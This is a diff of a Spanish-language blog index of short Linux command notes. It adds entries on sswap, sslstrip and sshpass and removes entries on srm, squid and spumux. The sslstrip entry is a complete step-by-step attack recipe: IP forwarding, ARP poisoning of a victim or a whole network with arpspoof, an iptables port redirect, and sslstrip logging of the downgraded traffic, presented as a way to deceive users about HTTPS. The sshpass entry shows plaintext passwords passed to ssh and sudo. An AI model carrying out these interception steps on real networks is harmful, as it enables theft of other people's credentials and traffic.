@@ -9,7 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si &hellip;">
+  <meta name="description" content="[secure-delete]. Borrado seguro de swap. Previamente desactivar con swapoff /dev/sda7 y al finalizar el proceso volver a activarla con swapon /dev/ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -74,6 +74,148 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sswap/">Sswap</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[secure-delete]. Borrado seguro de swap. Previamente desactivar con swapoff /dev/sda7 y al finalizar el proceso volver a activarla con swapon /dev/sda7 [Si no sabemos donde se encuentra la swap: cat /proc/swaps. Argumentos paracidos a srm [ver] y sfill [ver]. El espacio se sobreescribe 38 veces.</p>
+
+<blockquote><p>$ sswap -f /dev/sda7 (Modo rápido e inseguro)</p>
+
+<p>$ sswap -lv /dev/sda7 (Como lanzar dos veces sswap -f y mostrando el proceso)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sslstrip/">Sslstrip</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Herramienta para engañar al usuario haciéndole pensar que se encuentra en un sitio de Internet con cifrado SSL [HTTPS], cuando en realidad todos los datos están siendo transmitidos en abierto [HTTP].</p>
+
+<p>Configuración de reenvío de paquetes IP:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Envenenamiento ARP (paquete dsniff):</p>
+
+<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
+
+<p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
+
+<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
+
+<p>Redirección de puertos usando Iptables:</p>
+
+<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
+
+<p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
+
+<p>Arrancar sslstrip y ponerlo a la escucha:</p>
+
+<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
+
+<p>Visionar en tiempo real los paquetes capturados:</p>
+
+<blockquote><p>#  tail -f archivo.log</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/sshpass/">Sshpass</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>La contraseña para acceder por ssh a un host remoto se realiza de forma interactiva (entrándola por teclado) en algunos casos esto no es posible ya sea por tratarse de un script en el que se entra en un host remoto, se realiza alguna acción y se regresa al local o por que se precisa entrar la contraseña de forma no interactiva. Para estos casos puede ser útil este comando aunque considerando lo debil para la seguridad que entraña su uso ya que puede quedar registrado en &#8220;history&#8221;.</p>
+
+<blockquote><p>$ sshpass -f file_pas ssh -y usuario@host ifconfig (Ejecuta ifconfig en el remoto entrando como contraseña la primera palabra del archivo file_pas )</p>
+
+<p>$ sshpass -p 1234 ssh -t usuario@host &#8220;echo 1234 | sudo -S namp 192.168.1.0/24&#8221; (Ejecuta el comando &#8220;sudo nmap&#8221; en el host remoto que tiene por contraseña 1234.)</p></blockquote>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -569,185 +711,6 @@ ForwardX11Trusted yes
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/srm/">Srm</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>[secure-delete]. Aplicación para eliminar de forma segura datos de disco sobreescribiendo su espacio. Es de funcionamiento lento, pero por eso se le considera el más efectivo</p>
-
-<blockquote><p>$ srm -f dir (Modo rápido i el más inseguro)</p>
-
-<p>$ srm -l dir (Como realizar dos veces srm -f)</p>
-
-<p>$ srm archivo.txt (Se sobreescribe 38 veces)</p>
-
-<p>$ srm -rzv dir (se sobreescriben 38 veces los archivos y subdirectorios incluidos [r], sobreescribnedo ceros en el último borrado [z] y mostrando el proceso [v])</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/squid/">Squid</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Proxy caché (intermediario para nuestra conexion a internet, guardando las paginas visualizadas en una caché)</p>
-
-<blockquote><p># cp /etc/squid3/squid.conf{,.defaults} (Realizar copia de seguridad de la configuración)</p>
-
-<p># nano /etc/squid3/squid.conf</p></blockquote>
-
-<p>Modificamos/adaptamos los siguientes ajustes basicos:</p>
-
-<p>http_port 3128 #puerto de escucha</p>
-
-<p>cache_mem 100 MB #Tamaño memoria caché</p>
-
-<p>cache_dir ufs /var/spool/squid 700 16 256 #directorio y tamaño</p>
-
-<p>acl NuestraRed src 192.168.1.0/24 #Nombre y red a la que afecta</p>
-
-<p>http_access allow NuestraRed #permitir acceso a toda la red</p>
-
-<p>http_access allow deny all #Denegamos a los de fuera de la red</p>
-
-<p>auth_param basic /usr/lib/squid/ncsa_auth /etc/squid/passwd #ruta a usuarios</p>
-
-<p>auth_param basic realm “Mensaje de acceso” #mensaje al logearse</p>
-
-<p>auth_param basic children 5 #Procesos de autentificación</p>
-
-<p>auth_param basic basic credentialsttl 1 hours #tiempo</p>
-
-<blockquote><p># squid3 -k parse (Revisión de la sintaxis del archivo squid.conf)</p></blockquote>
-
-<p>Después de las modificaciones reiniciar servicio:</p>
-
-<blockquote><p># /etc/init.d/squid3 restart</p></blockquote>
-
-<p>Configuración de usuarios (/etc/squid/passwd):</p>
-
-<blockquote><p># htpasswd -c /etc/squid3/passwd user1 (Crear archivo [-c] nombre de usuario y pedirá contraseña)</p>
-
-<p># htpasswd /etc/squid3/passwd usuario2 (Sin parámetro -c porque el archivo ya está creado. Otro usuario y contraseña)</p></blockquote>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/spumux/">Spumux</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2014-07-13T16:51:00+02:00" pubdate data-updated="true">13-07-2014</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Generar subtítulos en un video mpeg.</p>
-
-<blockquote><p>$ spumux -s0 subt.xml &lt; video.mpeg > video_subtitulado.mpeg</p></blockquote>
-
-<p>Nota.- El archivo subt.xml con un contenido:</p>
-
-<pre><code>&lt;subpictures&gt;
-
-   &lt;stream&gt;
-
-        &lt;textsub filename="SUBTITULOS.srt" characterset="ISO8859-1"
-
-                 fontsize="24.0" font="Arial.ttf" horizontal-alignment="center"
-
-                 vertical-alignment="bottom" left-margin="60" right-margin="60"
-
-                 top-margin="20" bottom-margin="30" subtitle-fps="25"
-
-                 movie-fps="29.97" movie-width="720" movie-height="478"/&gt;
-
-   &lt;/stream&gt;
-
-&lt;/subpictures&gt;
-</code></pre>
-
-<p>La fuente Arial.ttf ha de estar [o tener un enlace] en el directorio ~/.spumux</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/32/">&larr; Older</a>
@@ -771,6 +734,22 @@ ForwardX11Trusted yes
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/stumpwm/">stumpwm</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/portsentry/">portsentry</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/exim/">exim</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/dtrx/">dtrx</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/systemctl/">systemctl</a>
       </li>
     
@@ -792,22 +771,6 @@ ForwardX11Trusted yes
     
       <li class="post">
         <a href="/blog/zypper/">zypper</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zmore/">zmore</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zmap/">zmap</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zless/">zless</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/zip/">zip</a>
       </li>
     
   </ul>
